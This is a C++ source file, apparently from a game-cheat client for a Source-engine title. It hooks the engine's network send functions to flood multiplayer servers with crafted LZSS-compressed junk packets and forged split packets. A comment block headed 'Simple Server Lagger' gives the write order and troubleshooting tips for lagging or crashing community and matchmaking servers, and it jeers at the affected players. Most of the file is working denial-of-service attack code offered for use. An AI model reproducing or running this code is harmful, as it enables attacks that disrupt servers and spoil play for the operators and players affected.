		//Debug::QuickPrint("Writing Fake LZSS Data");
		dataFragments_s* data = new dataFragments_t;
		//data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
		*(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
		data->bits = data->bytes * 8;
		data->isCompressed = true;
		data->isReplayDemo = false;
		data->nUncompressedSize = *(data->buffer + sizeof(int32_t)) * 2;
		data->file = (void*)999;
		strcpy(data->filename, "%s%s%s%s\0");
		//WriteFragmentsToSubChannel(ecx, data, buf, 0, data->bytes);
		WriteCrasherData(buf, data, data->bytes, 0);
		buf->m_bOverflow = false;

		return true;

	}
	else if (config->lagger.FULLONBOGANFUCKERY) {
		*(float*)((uintptr_t)ecx + (uintptr_t)16732) = -1;
		memory->clientState->paused = false;
		memory->clientState->deltaTick++;

		//Debug::QuickPrint("Writing Fake LZSS Data");
		dataFragments_s* data = new dataFragments_t;
		data->bytes = CreateLZSSData(&data->buffer);
		*(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
		data->bits = data->bytes * 8;
		data->isCompressed = true;
		data->isReplayDemo = false;
		data->nUncompressedSize = *(data->buffer + sizeof(int32_t));
		data->file = (void*)999;
		strcpy(data->filename, "%s%s%s%s\0");
		WriteFragmentsToSubChannel(ecx, data, buf, 0, data->bytes);
		buf->m_bOverflow = false;

		return true;
	}
#endif
	//sizeof(bf_write);

	return orgRet;

}



//return orgRet;
//}
/*


	return orgRet;
}
*/
#ifdef LAGGER
bool __stdcall CustomSendSubChannel(void* netchan, void* buffer) {


	

	bf_write* buf = reinterpret_cast<bf_write*>(buffer);
	subChannel_s* subChan = NULL;
	subChan = &(((subChannel_s*)netchan + 944))[0];
	if (subChan) {
		if (subChan->state == SUBCHANNEL_TOSEND)
			return false;
	}
	if (0) {
		Debug::QuickPrint("Writing Fake LZSS Data");
		dataFragments_s* data = new dataFragments_t;
		//data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
		*(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
		data->bits = data->bytes * 8;
		data->isCompressed = true;
		data->isReplayDemo = false;
		data->nUncompressedSize = *(data->buffer + sizeof(int32_t)) / 2;
		data->file = (void*)999;
		strcpy(data->filename, "%s%s%s%s\0");
		//WriteFragmentsToSubChannel(NULL, data, buf, config->mmlagger.chan, data->bytes);
		buf->m_bOverflow = false;
		return true;
	}
}
#endif


// Spam LZSS Data and bog down the server. net_chan_limit_msec 20 pretty much makes this worthless

/*

														Simple Server Lagger


	Write Order In SendSubChannelData():

	buf->WriteUBitLong(stream, 3); // SubChannel
	buf->WriteOneBit(1); // Data Follows

	buf->WriteOneBit(1); // Not Single Block (Too Allow File Transfer)

	buf->WriteOneBit(1); // uses fragments with start fragment offset byte

	buf->WriteUBitLong(0, MAX_FILE_SIZE_BITS - FRAGMENT_BITS); ( write it to 0 so header info is read )
	buf->WriteUBitLong(0, 3);  // Write it to 0


	buf->WriteOneBit(1); // It "Is A File" (Bypass ProcessMessages & "Process Time Exceeded" )

	buf->WriteUBitLong( data->transferID , MAX_FILE_SIZE_BITS);
	buf->WriteString( data->filename, MAX_OSPATH );

	buf->WriteOneBit(1); // Not A Replay Demo

	buf->WriteOneBit(data->isCompressed); // Data is compressed (HIT LZSS)

	buf->WriteUBitLong( *(data->buffer + sizeof(int32_t)), MAX_FILE_SIZE_BITS );

	buf->WriteBytes( data->buffer, size ); // write data

	dataFragment_t Definition:


	typedef struct dataFragments_s
	{
		void* file = NULL;			
		char			filename[MAX_PATH]; // Who Cares it can be anything
		char* buffer;			// fill with our bullshit compressed LZSS Data
		unsigned int	bytes;			// size in bytes
		unsigned int	bits;			// bytes * 8
		unsigned int	transferID;		// whatever who cares
		bool			isCompressed = true;	// Yea its compressed (hit NET_BufferToBufferDecompress)
		unsigned int	nUncompressedSize; // full size in bytes (I like 0xFFFFFFFD)
		bool			asTCP;			// send as TCP stream. We Dont Care
		int				numFragments = 0;	// Who cares we don't write it
		int				ackedFragments; // who cares we don't write it
		int				pendingFragments; // who cares we don't write it
    } dataFragments_t;

	" dUdE ThE sErVeRs dEaD!!! "
	" LAGGGGGGGGGGG BROOOOO!!! "

	"NET_BufferToBufferDecompress with improperly sized dest buffer (3355443 in, 6710886 needed)" in console means you fucked up
	"Netchannel: failed reading message 2 from XXX.XXX.XXX.XXX:27005." in console means you fucked up

	" Netchannel: unknown net message (127) from XXX.XXX.XXX.XXX:27005.
	  unknown message
	  Dumping messages for channel UncompressFragments(XXX.XXX.XXX.XXX:27005.) 0x0x100a2680
	  Header bits 96, flags == 225
	  0 messages
	  Raw
	" in console means you fucked up, but you'll still be able to lag community servers (if the ain't got net_chan_limit_msec set). neato.

	You can do a ghetto method in CNetChan::CompressFragments, but dont. Do it in CNetChan::SendSubChannelData().
	If you're having issues getting it to work, try sending clc_BaseLineAck, clc_Move, and net_Tick messages with
	bForceReliable set, and running NetChannel->Transmit(false) directly after.

	" why's the server's CPU usage at 100% on thread 1??? "
	" can we donate to get this server a better cpu this lag is terrible! "

	CLZSS Compressor;
	char* buffer = (char*)malloc(SizeOfFakePacket + 8);

	for (int i = 0; i < SizeOfFakePacket; i += 8) {
		*(int64_t*)&buffer[i] = (int64_t)rand()% 0x7FFFFFFFFFFFFFFF;
	}

	Debug::QuickPrint("Writing LZSSData to Store Buffer");
	LZSSData = Compressor.Compress((unsigned char*)buffer, SizeOfFakePacket, &output_size);

	- Enron 01/21/2021

*/



typedef void(__thiscall* GetSendFrameFunc)(void*, double, double);
void __fastcall EngineHooks::CGameClient_GetSendFrame(void* ecx, void* edx, double unkn1, double unkn2){
	Debug::QuickPrint("Get Send Frame");

	if (config->misc.autoAccept) {
		return;
	}

	((GetSendFrameFunc)oCBaseClient_GetSendFrame)(ecx, unkn1, unkn2);
}
#define	NET_MAX_MESSAGE	PAD_NUMBER( ( NET_MAX_PAYLOAD + HEADER_BYTES ), 16 )



template <typename T>
static constexpr auto relativeToAbsolute(uintptr_t address) noexcept
{
	return (T)(address + 4 + *reinterpret_cast<std::int32_t*>(address));
}


std::string hexDump(const char* desc, void* addr, int len)
{
	if (len <= 0)
		return std::string("NOT VALID SIZE");

	char* buffer = (char*)malloc( ((len * 20) * sizeof(char)));
	// DUMB ASS WAY TO DO THIS!!!

	if (!buffer)
		return std::string("BUFFER FAILED TO ALLOC");

	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	char tempBuf[4096];

	// Output description if given.
	if (desc != NULL) {
		snprintf(tempBuf, 4096, "%s:\n", desc);
		strcat(buffer, tempBuf);
	}

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0) {
				snprintf(tempBuf, 4096, "  %s\n", buff);
				strcat(buffer, tempBuf);
			}

			// Output the offset.
			snprintf(tempBuf, 4096, "  %04x ", i);
			strcat(buffer, tempBuf);
		}

		// Now the hex code for the specific character.
		snprintf(tempBuf, 4096, " %02x", pc[i]);
		strcat(buffer, tempBuf);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		snprintf(tempBuf, 4096, "   ");
		strcat(buffer, tempBuf);
		i++;
	}

	// And print the final ASCII bit.
	snprintf(tempBuf, 4096, "  %s\n", buff);
	strcat(buffer, tempBuf);

	std::string retStr{ buffer };
	free(buffer);
	return retStr;
}


// TODO :: MAKE THIS WORK WITH ONE CLASS
class LZSSLagger2 {

public:
	bool init = false;
	unsigned char* LZSSData;
	unsigned int output_size = 0;
	int SizeOfFakePacket = 0;
	int lastPacketSize = 0;


	LZSSLagger2(int size) { Init(size); }
	void Init(int size) {

		lastPacketSize = size;
		CLZSS Compressor;
		char* buffer = (char*)malloc(size + sizeof(unsigned int));

		for (int i = 0; i < size; i += 8) {
			*(int8_t*)(&buffer[i] + sizeof(unsigned int)) = (int8_t)rand() % 0x7FFFFFFFF;
		}
		LZSSData = Compressor.CompressLeave8((unsigned char*)buffer, size, &output_size);
		output_size += sizeof(unsigned int);
		init = true;

	}
	int CreateLZSSData(char** buffer_to_write) {

		if (!init) {
			Debug::QuickPrint("Writing LZSSData to Store Buffer");
		}

		*buffer_to_write = (char*)LZSSData;
		return output_size;
	}
};



int TickOnLastSent = 0;

typedef signed int(__cdecl* NET_SendToImplFunc)(int a1, SOCKET a2, signed int a3, netpacket_s* a4, int a5);
signed int __cdecl EngineHooks::NET_SendToImpl(int a1, SOCKET a2, signed int a3, netpacket_s* a4, int a5) {
	int ret = ((NET_SendToImplFunc)oNET_SendToImpl)(a1, a2,a3, a4, a5);

	Debug::QuickPrint("Net_SendToImpl");
	if (GetAsyncKeyState(config->TestShit.fuckKey6)) {

		static LZSSLagger2 g_LZSSLagCreator2((NET_MAX_MESSAGE - 17));

		if ((memory->clientState->signonState >= SIGNONSTATE_FULL) && localPlayer.get() && localPlayer->isAlive()) {
			Debug::QuickPrint("Sending Data Through Net_SendToImpl");
			char* Packet;
			int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);
			bytes = std::clamp(bytes, 0, NET_MAX_MESSAGE - 1);
			*(unsigned int*)Packet = (unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET;
			signed int nNumberOfBytesSent = ((NET_SendToImplFunc)oNET_SendToImpl)((int)Packet, a2, bytes, a4, a5);
			if (nNumberOfBytesSent <= 0) {
				Debug::QuickPrint("Net_SentToImpl Did Not Send Data Out!");
			}
			else {
				Debug::QuickPrint(("Bytes Sent = " + std::to_string(nNumberOfBytesSent)).c_str());
			}

#if 0
			static uintptr_t ConvertFunction = relativeToAbsolute<uintptr_t>(Memory::findPattern_ex(L"engine", "\xE8????\x6A\x10\x8D\x45\xAC") + 1);
			typedef int16_t(__thiscall* ConvertToSockAddrFunc)(netpacket_s* _this, void* valve_structure);
			char* Packet;
			int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);

			bytes = std::clamp(bytes, 0, NET_MAX_MESSAGE - 1);
			if (bytes) {
				*(unsigned int*)Packet = (unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET;
				DWORD NumberOfBytesSent;
				_WSABUF Buffers;
				Buffers.len = bytes;
				Buffers.buf = Packet;
				sockaddr To;
				((ConvertToSockAddrFunc)ConvertFunction)(a4, &To);

				if (WSASendTo(a2, &Buffers, 1, &NumberOfBytesSent, 0, &To, 16, 0, 0) == SOCKET_ERROR) {
					std::string errorCode = std::to_string(WSAGetLastError());
					Debug::QuickPrint(("Couldn\'t Send LZSS Lag Data In NET_SendToImpl due to: " + errorCode).c_str());
				}

				if (!NumberOfBytesSent) {
					std::string errorCode = std::to_string(WSAGetLastError());
					Debug::QuickPrint(("Didn\'t Send LZSS Lag Data In NET_SendToImpl due to: " + errorCode).c_str());
				}
				else {
					Debug::QuickPrint(("Bytes Sent = " + std::to_string(NumberOfBytesSent)).c_str());
				}

			}
			else {
				Debug::QuickPrint("No Output Data???");
			}
#endif
		}
	}

	return ret;
}



DWORD ReturnAddr;
typedef signed int(__stdcall* Calls_SendToImplFunc)(int buffer, int* socket, signed int size, int pVoice);
signed int __cdecl EngineHooks::Calls_SendToImpl(int buffer, int* socket, signed int size, int pVoice){
	signed int ret = ((Calls_SendToImplFunc)memory->oCalls_SendToImpl)(buffer, socket, size, pVoice);
	if (GetAsyncKeyState(config->TestShit.fuckKey6)) {
		static LZSSLagger2 g_LZSSLagCreator2((NET_MAX_MESSAGE - 17));
		if ((memory->clientState->signonState >= SIGNONSTATE_FULL) && localPlayer.get() && localPlayer->isAlive()) {
			Debug::QuickPrint("Sending Data Through Calls_SendToImpl");
			char* Packet;
			int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);
			bytes = std::clamp(bytes, 0, NET_MAX_MESSAGE - 1);
			*(unsigned int*)Packet = (unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET;
			signed int nNumberOfBytesSent = ((Calls_SendToImplFunc)memory->oCalls_SendToImpl)((int)Packet, socket, bytes, pVoice);
			if (nNumberOfBytesSent <= 0) {
				Debug::QuickPrint("Calls_SendToImpl Did Not Send Data Out!");
			}
			else {
				Debug::QuickPrint(("Bytes Sent = " + std::to_string(nNumberOfBytesSent)).c_str());
			}
			ret = nNumberOfBytesSent;
		}
	}
	return ret;
}



void __declspec(naked) ourCalls_SendToImplFunc() {
	__asm {
		push ebp
		mov ebp, esp


	}
}

#if 1
typedef bool(__fastcall* NET_SendPacketFunc)(void* chan, unsigned char* data, double to, size_t length, bf_write* pVoicePayload, bool bUseCompression);
int __fastcall EngineHooks::NET_SendPacket(void* chan, unsigned char* data, double to, size_t length, bf_write* pVoicePayload, bool bUseCompression) {
	int ret = ((NET_SendPacketFunc)memory->oNET_SendPacket)(chan, data,  to, length, pVoicePayload, bUseCompression);	
	char buffer[4096];
	const char* formatter = { ""
		"NET_SendPacket Call: "
		"  chan			   : %d \n"
		"  sock			   : %d \n"
		"  to			   : %d \n"
		"  data			   : %d \n"
		"  length		   : %d \n"
		"  bUseCompression : %d \n"
	};

	snprintf(buffer, 4096, formatter, chan, to, data, length , bUseCompression);
	Debug::QuickPrint(buffer);
	

	if (config && GetAsyncKeyState(config->TestShit.fuckKey6)) {
		char* Packet;
		//int bytes = g_LZSSLagCreator.CreateLZSSData(&Packet);
		size_t nNumberOfBytesSent = ((NET_SendPacketFunc)memory->oNET_SendPacket)(chan, (unsigned char*)Packet, to, length,  pVoicePayload, true/*, true*/);
		if (nNumberOfBytesSent <= 0) {
			Debug::QuickPrint("NET_SendPacket Did Not Send Data Out!");
		}
		else {
			Debug::QuickPrint(("NET_SendPacket Bytes Sent = " + std::to_string(nNumberOfBytesSent)).c_str());
		}
	}




	return ret;
}
bool g_bCallOriginal = false;
void* g_pOrgNETSendPacketAddr = nullptr;
__declspec (naked) void NET_SendPacket_Hk()
{
	__asm
	{
		push ebp
		mov ebp, esp



	}
}
#endif













/*

	bf_write* buffer = reinterpret_cast<bf_write*>(data);
	NetworkChannel* netChannel = reinterpret_cast<NetworkChannel*>(netChan);

*/




typedef void(__thiscall* SendClientMessagesFunc)(void*, double, double, char);
void __fastcall EngineHooks::SendClientMessages(void* _this, void* edx,  double a2, double a3, char bSendSnapshots) {


	return;


	((SendClientMessagesFunc)oSendClientMessages)(_this, a2, a3, bSendSnapshots);
	return;
}

typedef bool(__thiscall* EnqueueVeryLargeAsyncTransferFunc)(void*, NetworkMessage* msg);
bool __fastcall EngineHooks::EnqueueVeryLargeAsyncTransfer(void* netchannel, void*, NetworkMessage* msg) {
	Debug::QuickWarning(std::string("EnqueueVeryLargeAsyncTransfer : Type = " + std::to_string(msg->getType())));

	return ((EnqueueVeryLargeAsyncTransferFunc)memory->oEnqueVeryLargeAsyncTransfer)(netchannel, msg);
}




inline void CheckSumPacket(const void* pData, size_t nSize){
	bf_write buf((char*)pData, nSize);
	int offset = ((sizeof(unsigned int) + sizeof(unsigned int) + sizeof(char) + sizeof(unsigned short)));
	buf.SeekToBit((offset - sizeof(unsigned short)) << 3);
	buf.WriteUBitLong(BufferToShortChecksum((const void*)((char*)pData + offset), nSize - offset), 16);
}

#include "SDK/SDK/IceKey.h"


int EncrptPacket(NetworkChannel* chan, void* pData, size_t nSize) {

	if (const unsigned char* pubEncryptionKey = chan ? chan->GetChannelEncryptionKey() : NULL)
	{
		IceKey iceKey(2);
		iceKey.set(pubEncryptionKey);
		CUtlMemoryFixedGrowable< byte, NET_COMPRESSION_STACKBUF_SIZE > memEncryptedAll(NET_COMPRESSION_STACKBUF_SIZE);
		// Generate some random fudge, ICE operates on 64-bit blocks, so make sure our total size is a multiple of 8 bytes
		int numRandomFudgeBytes = RandomInt(16, 72);
		int numTotalEncryptedBytes = 1 + numRandomFudgeBytes + sizeof(int32) + nSize;
		numRandomFudgeBytes += iceKey.blockSize() - (numTotalEncryptedBytes % iceKey.blockSize());
		numTotalEncryptedBytes = 1 + numRandomFudgeBytes + sizeof(int32) + nSize;

		char* pchRandomFudgeBytes = (char*)malloc(numRandomFudgeBytes);
		for (int k = 0; k < numRandomFudgeBytes; ++k)
			pchRandomFudgeBytes[k] = RandomInt(16, 250);

		// Prepare the encrypted memory
		memEncryptedAll.EnsureCapacity(numTotalEncryptedBytes);
		*memEncryptedAll.Base() = numRandomFudgeBytes;
		EngineHooks::ehQ_memcpy(memEncryptedAll.Base() + 1, pchRandomFudgeBytes, numRandomFudgeBytes);

		int32 const numBytesWrittenWire = BigLong(nSize);	// byteswap for the wire
		EngineHooks::ehQ_memcpy(memEncryptedAll.Base() + 1 + numRandomFudgeBytes, (void*)&numBytesWrittenWire, sizeof(numBytesWrittenWire));
		EngineHooks::ehQ_memcpy(memEncryptedAll.Base() + 1 + numRandomFudgeBytes + sizeof(int32), pData, nSize);

		// Encrypt the message
		unsigned char* pchCryptoBuffer = (unsigned char*)malloc(iceKey.blockSize());
		for (int k = 0; k < numTotalEncryptedBytes; k += iceKey.blockSize())
		{
			iceKey.encrypt((const unsigned char*)(memEncryptedAll.Base() + k), pchCryptoBuffer);
			EngineHooks::ehQ_memcpy(memEncryptedAll.Base() + k, pchCryptoBuffer, iceKey.blockSize());
		}

		// Set the pointers to network out the encrypted data
		pData = memEncryptedAll.Base();
		nSize = numTotalEncryptedBytes;
		//free(pchRandomFudgeBytes);
		free(pchCryptoBuffer);
	}

	return nSize;
}

int DecryptPacket(NetworkChannel* chan, void* pData, size_t nSize) {
	if (const unsigned char* pubEncryptionKey = chan->GetChannelEncryptionKey())
	{
		// Decrypt the packet
		IceKey iceKey(2);
		iceKey.set(pubEncryptionKey);
		CUtlMemoryFixedGrowable< byte, NET_COMPRESSION_STACKBUF_SIZE > memDecryptedAll(NET_COMPRESSION_STACKBUF_SIZE);

			memDecryptedAll.EnsureCapacity(nSize);
			unsigned char* pchCryptoBuffer = (unsigned char*)malloc(iceKey.blockSize());
			for (int k = 0; k < (int)nSize; k += iceKey.blockSize())
			{
				iceKey.decrypt((const unsigned char*)((unsigned char* )pData + k), pchCryptoBuffer);
				EngineHooks::ehQ_memcpy(memDecryptedAll.Base() + k, pchCryptoBuffer, iceKey.blockSize());
			}

			// Check how much random fudge we have
			int numRandomFudgeBytes = *memDecryptedAll.Base();
			if ((numRandomFudgeBytes > 0) && (int(numRandomFudgeBytes + 1 + sizeof(int32)) < nSize))
			{
				// Fetch the size of the encrypted message
				int32 numBytesWrittenWire = 0;
				EngineHooks::ehQ_memcpy(&numBytesWrittenWire, memDecryptedAll.Base() + 1 + numRandomFudgeBytes, sizeof(int32));
				int32 const numBytesWritten = BigLong(numBytesWrittenWire);	// byteswap from the wire

				// Make sure the total size of the message matches the expectations
				if (int(numRandomFudgeBytes + 1 + sizeof(int32) + numBytesWritten) == nSize)
				{
					// Fix the packet to point at decrypted data!
					nSize = numBytesWritten;
					EngineHooks::ehQ_memcpy(pData, memDecryptedAll.Base() + 1 + numRandomFudgeBytes + sizeof(int32), nSize);
				}
			}
			free(pchCryptoBuffer);
		
	}
	return nSize;
}



inline int CheckSumAndEncryptPacket(NetworkChannel* chan, void* pData, size_t nSize) {
	CheckSumPacket(pData, nSize);
	return EncrptPacket(chan, pData, nSize);
}

#ifndef NOTHING

typedef signed int(__cdecl* Calls_SendToImplFunc2)(int* buffer, unsigned char* socket, signed int size, int pVoice);
static int callAmount = 0;
static bool inLoop = false;
unsigned char* compressPacket = NULL;
int CUSTOM_NET_SendLong(void* chan, unsigned char* sendbuf, int sendlen, int nMaxRoutableSize, bool Encrypt = false, bool Decrypt = true)
{

	NetworkChannel* netchan = reinterpret_cast<NetworkChannel*>(chan);

	short nSplitSizeMinusHeader = nMaxRoutableSize - sizeof(SPLITPACKET);



	


	int nSequenceNumber = -1;



	char			packet[MAX_ROUTABLE_PAYLOAD];
	SPLITPACKET* pPacket = (SPLITPACKET*)packet;

	// Make pPacket data network endian correct
	pPacket->netID = LittleLong(NET_HEADER_FLAG_SPLITPACKET);
	pPacket->nSplitSize = LittleShort(576);
	if (nSplitSizeMinusHeader < 576) {
		pPacket->nSplitSize = LittleShort(576);
	}

#ifdef FORCE_NET_SENDLONG_COMPRESS
	if (Encrypt) {
		int savedsendlen = sendlen;
		if (sendlen) {
			if(Decrypt)
				sendlen = DecryptPacket((NetworkChannel*)chan, sendbuf, sendlen);

			int decsaved = sendlen;
			if (sendlen < 576)
				sendlen = ((576 * 2) - sendlen) + sendlen;
			//if ((sendlen < savedsendlen) || (sendlen < 576))
			//	return savedsendlen;
			unsigned char* sendbuf2 = (unsigned char*)malloc(sendlen);
			EngineHooks::ehQ_memcpy(sendbuf2, sendbuf, decsaved);
			if (sendbuf2)
				sendbuf = sendbuf2;
			CheckSumPacket(sendbuf, sendlen);
		}


		if (Encrypt && (*(unsigned int*)sendbuf != LittleLong((unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET)) && false) {
			if (!compressPacket) {
				compressPacket = (unsigned char*)malloc((NET_MAX_MESSAGE * 8));
			}
			static CLZSS Compressor;
			unsigned int Size;
			int ret = (int)Compressor.CompressNoAlloc((unsigned char*)socket, sendlen, compressPacket + sizeof(unsigned int), &Size); /* Actually Leave's 4 */
			if (!compressPacket)
				return sendlen;
			*(unsigned int*)compressPacket = LittleLong((unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET);
			sendbuf = compressPacket;
		}

		if (Encrypt) {
			sendlen = EncrptPacket((NetworkChannel*)chan, sendbuf, sendlen);
		}
	}
#endif
	unsigned int nPacketCount = (sendlen + nSplitSizeMinusHeader - 1) / nSplitSizeMinusHeader;

	if (nPacketCount > MAX_SPLITPACKET_SPLITS)
		nPacketCount = MAX_SPLITPACKET_SPLITS;

	nPacketCount = std::clamp(nPacketCount, 1u, 127u);

	int nBytesLeft = sendlen;
	int nPacketNumber = 0;
	int nTotalBytesSent = 0;
	int nFragmentsSent = 0;
	pPacket->packetID = -1;
	nSequenceNumber = ++(((DWORD*)chan)[4196]);
	pPacket->sequenceNumber = LittleLong(nSequenceNumber);



	while (nBytesLeft > 0)
	{
		int size = min(nSplitSizeMinusHeader, nBytesLeft);

		if (nPacketNumber >= MAX_SPLITPACKET_SPLITS)
			return nTotalBytesSent;

		pPacket->packetID = LittleShort((short)((nPacketNumber << 8) + nPacketCount));

		EngineHooks::ehQ_memcpy(packet + sizeof(SPLITPACKET), (void*)((uintptr_t)sendbuf + (nPacketNumber * nSplitSizeMinusHeader)), size);

		int ret = 0;
		// https://git.byr.ac.cn/Gaojianli/cstrike15_src/-/blob/34f0997fbe5efa778d296a013baf12a00faa608d/engine/net_ws.cpp
		//ret = NET_SendTo(To, netchann, size+12, -1);
		int To = -2;
		int* toAddr = &To;
		int ASMSIZE = size + 12;
		void* callSentToPtr = (void*)memory->Calls_SendToImpl;

		//Debug::QuickPrint("Calling Calls_SentToImpl");

		__asm {
			mov     eax, ASMSIZE
			push    0FFFFFFFFh
			push    eax
			lea     edx, packet
			mov		ecx, netchan
			call callSentToPtr
			add esp,8
			mov ret, eax
		}

		//ret = ((Calls_SendToImplFunc2)memory->Calls_SendToImpl)(&To, sendbuf, size + 12, -1);
		++nFragmentsSent;
		//Debug::QuickPrint(("NET_SendLong_Rebuilt Ret = " + std::to_string(ret)).c_str());
		if (ret < 0)
		{
			return ret;
		}

		if (ret >= size)
		{
			nTotalBytesSent += size;
		}



		nBytesLeft -= size;
		++nPacketNumber;

		if (nPacketNumber > 128)
			return nTotalBytesSent + nBytesLeft;


		// Always bitch about split packets in debug
	}

	return nTotalBytesSent;
}
static int CUSTOM_NET_SendLong_PassPacket(void* chan, SPLITPACKET* pPacket, int sendlen, int nMaxRoutableSize, int timesToSend)
{

	NetworkChannel* netchan = reinterpret_cast<NetworkChannel*>(chan);

	short nSplitSizeMinusHeader = nMaxRoutableSize - sizeof(SPLITPACKET);



	//Debug::QuickPrint(("NET_SendLong_Rebuilt_PassPacket sendlen = " + std::to_string(sendlen) + " : nMaxRoutableSize = " + std::to_string(nMaxRoutableSize)).c_str());
	//Debug::QuickPrint(std::to_string(netchan->getLatency(FLOW_OUTGOING)).c_str());



	//int nSequenceNumber = -1;
	if (netchan)
	{
		//nSequenceNumber = interfaces->engine->getNetworkChannel()->OutSequenceNr++;
	}

	pPacket->netID = LittleLong(NET_HEADER_FLAG_SPLITPACKET);
	
	if (nSplitSizeMinusHeader < 576) {
		pPacket->nSplitSize = LittleShort(576);
	}
	else {
		pPacket->nSplitSize = LittleShort(nSplitSizeMinusHeader);
	}
	int nPacketCount = 1;
	int nBytesLeft = sendlen;
	int nPacketNumber = 0;
	pPacket->packetID = -1;
	//int nSequenceNumber = ++(((DWORD*)chan)[4196]);
	++(((DWORD*)chan)[4196]);
	while (timesToSend > 0)
	{

		int nSequenceNumber = -1;
		pPacket->sequenceNumber = LittleLong(nSequenceNumber);

		timesToSend--;
		//int size = min(nSplitSizeMinusHeader, 576);

		int size = min(nSplitSizeMinusHeader, nBytesLeft);

		if (nPacketNumber >= MAX_SPLITPACKET_SPLITS)
			return sendlen;

		pPacket->packetID = LittleShort((short)((nPacketNumber << 8) + nPacketCount));

		int ret = 0;
		int ASMSIZE = size + sizeof(SPLITPACKET);
		void* callSentToPtr = (void*)memory->Calls_SendToImpl;
		__asm {
			mov     eax, ASMSIZE
			push    0FFFFFFFFh
			push    eax
			lea     edx, pPacket
			mov		ecx, netchan
			call callSentToPtr
			add esp, 8
			mov ret, eax
		}

		if (ret < 0)
		{
			return ret;
		}
		//++nPacketNumber;

	}

}


static char* LZSSPacket = NULL;
int bytes = 0;
//int counter = 0;
static int LZSSAttackOnReceiveDatagram(void* chan) {

	if (!LZSSPacket) {
		const int size = (MAX_SPLITPACKET_SPLITS - 5) * 118;
		static LZSSLagger2 g_LZSSLagCreator2(size);
		bytes = g_LZSSLagCreator2.CreateLZSSData(&LZSSPacket);
		*(unsigned int*)LZSSPacket = LittleLong((unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET);
		bytes = std::clamp(bytes, 0, (int)((MAX_SPLITPACKET_SPLITS-4) * 1188));
		bytes = EncrptPacket((NetworkChannel*)chan, LZSSPacket, bytes);
	}
	int ret = CUSTOM_NET_SendLong(chan, (unsigned char*)LZSSPacket, bytes, 1200, false);
	return ret;
}





struct ARGS {
	void* netchann;
	DWORD* socket;
	int nBytesLeft;
	int nMaxRoutableSize;
} ARGS_KEEP;

bool shouldCall = true;
int counter = 0;
typedef int(__fastcall* NET_SendLongFunc)(void* netchannel, DWORD* socket, int nBytesLeft, int nMaxRoutableSize);
int __fastcall EngineHooks::NET_SendLong (void* netchannel, DWORD* socket, int nBytesLeft, int nMaxRoutableSize) {
	//Debug::QuickPrint("In NET_SendLong");
	ARGS_KEEP.netchann = netchannel;
	ARGS_KEEP.socket = socket;
	ARGS_KEEP.nBytesLeft = nBytesLeft;
	ARGS_KEEP.nMaxRoutableSize = nMaxRoutableSize;
	if (config->mmcrasher.enabled) {
			if (counter >= config->mmcrasher.timesToPostpone) {
				if (shouldCall) {
					_beginthreadex(0, 0, FuckServer, 0, NULL, 0);
				}
				counter = 0;
			}
			counter++;
			if(config->mmcrasher.breturn)
				return nBytesLeft;
	}
	return CUSTOM_NET_SendLong(netchannel, (unsigned char*)socket, nBytesLeft, 576); //((NET_SendLongFunc)memory->oNET_SendLong)(netchannel, socket, nBytesLeft, nMaxRoutableSize);
}

inline void Encrypt8ByteSequence(IceKey& cipher, const unsigned char* plainText, unsigned char* cipherText)
{
	cipher.encrypt(plainText, cipherText);
}

void EncryptBuffer(IceKey& cipher, unsigned char* bufData, uint bufferSize)
{
	unsigned char* cipherText = bufData;
	unsigned char* plainText = bufData;
	uint bytesEncrypted = 0;

	while (bytesEncrypted < bufferSize)
	{
		// encrypt 8 byte section
		Encrypt8ByteSequence(cipher, plainText, cipherText);
		bytesEncrypted += 8;
		cipherText += 8;
		plainText += 8;
	}
}
#if 0
void BuildReserveServerPayload(bf_write& msg, int nChallengeNr)
{
	char	buffer[MAX_OOB_KEYVALUES + 128];
	bf_write payload(buffer, sizeof(buffer));


	// send the cookie that everyone in the joining party will provide to let them into the reserved server
	//payload.WriteLongLong(m_nServerReservationCookie);

	int nSettingsLength = 0;
	CUtlBuffer buf;
	//this buffer needs to be endian compliant sot he X360 can talk correctly to the PC Dedicated server.
	if (buf.IsBigEndian())
	{
		buf.SetBigEndian(false);
	}
	if (m_pKVGameSettings)
	{
		// if we have KeyValues with game settings, convert to binary blob
		m_pKVGameSettings->WriteAsBinary(buf);
		nSettingsLength = buf.TellPut();
		// make sure it's not going to overflow one UDP packet
		Assert(nSettingsLength <= MAX_OOB_KEYVALUES);
		if (nSettingsLength > MAX_OOB_KEYVALUES)
		{
			ReservationResponseReply_t reply;
			reply.m_adrFrom = m_netadrReserveServer.Get(0).m_adrRemote;
			HandleReservationResponse(reply);
			return;
		}
	}

	// write # of bytes in game settings keyvalues
	payload.WriteLong(nSettingsLength);
	if (nSettingsLength > 0)
	{
		// write game setting keyvalues
		payload.WriteBytes(buf.Base(), nSettingsLength);
	}

	if (/*!IsX360()*/ true)
	{
		// Pad it to multiple of 8 bytes
		while (payload.GetNumBytesWritten() % 8)
		{
			payload.WriteByte(0);
		}

		IceKey cipher(1); /* medium encryption level */
		unsigned char ucEncryptionKey[8] = { 0 };
		*(int*)&ucEncryptionKey[0] = LittleDWord(nChallengeNr ^ 0x5ef8ce12);
		*(int*)&ucEncryptionKey[4] = LittleDWord(nChallengeNr ^ 0xaa98e42c);

		cipher.set(ucEncryptionKey);

